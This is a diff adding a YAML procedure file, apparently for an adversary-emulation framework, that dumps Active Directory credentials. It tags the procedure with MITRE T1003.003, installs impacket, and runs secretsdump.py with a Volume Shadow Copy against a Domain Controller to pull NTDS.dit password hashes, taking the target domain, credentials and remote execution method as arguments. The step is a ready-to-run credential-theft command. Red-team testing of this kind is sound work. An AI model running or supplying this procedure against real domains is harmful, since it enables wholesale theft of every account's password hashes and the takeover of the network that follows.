@@ -1,0 +1,52 @@
+---
+api_version: 2.0
+uuid: d39002bb-5ba3-4977-81b4-4a77b1e46ae4
+name: Extract NTDS.dit from VSS Copy
+authors:
+  - isaac_fletcher
+description: |
+  Extracts credentials from a Domain Controller by dumping the NTDS.dit database
+  via a Volume Shadow Copy (VSS). Uses Impacket's secretsdump.py with the -use-vss
+  flag to create a shadow copy of the system drive, copy the NTDS.dit and SYSTEM
+  hive, and extract password hashes offline.
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1003 OS Credential Dumping
+  subtechniques:
+    - T1003.003 NTDS
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: username
+    description: Username for authentication (without domain prefix)
+  - name: password
+    description: Password for authentication
+  - name: method
+    description: Execution method (e.g., smbexec, wmiexec, mmcexec)
+    default: smbexec
+    choices:
+      - smbexec
+      - wmiexec
+      - mmcexec
+steps:
+  - name: setup_impacket
+    description: Install impacket
+    ttp: //utils/pip-install/ttp.yaml
+    args:
+      modules: "impacket"
+
+  - name: dump_ntds
+    description: Perform NTDS.dit dump via VSS copy
+    inline: |
+      secretsdump.py -use-vss -skip-sam -skip-security -exec-method {{.Args.method}} -ts \
+        "{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}@{{.Args.dc}}"
